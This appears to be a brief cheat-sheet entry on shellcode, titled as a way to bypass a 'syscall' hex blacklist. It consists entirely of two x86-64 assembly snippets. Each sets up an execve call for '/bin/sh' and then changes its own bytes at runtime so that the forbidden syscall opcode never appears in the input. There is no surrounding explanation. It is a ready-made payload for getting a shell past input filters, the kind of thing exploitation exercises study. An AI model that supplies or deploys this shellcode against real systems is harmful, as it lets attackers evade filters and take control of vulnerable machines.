# Shellcode

### Bypass \`syscall\` hex blacklist

```asm
    mov rax, 0x3b
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    dec byte ptr [rip + syscall]
    dec byte ptr [rip + syscall + 1]
    
syscall:
    .byte 0x10, 0x06
```

```asm
    mov rax, 0x3b
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    inc byte ptr [rip + syscall]
    inc byte ptr [rip + syscall + 1]
    
syscall:
    .byte 0x0e, 0x04
```

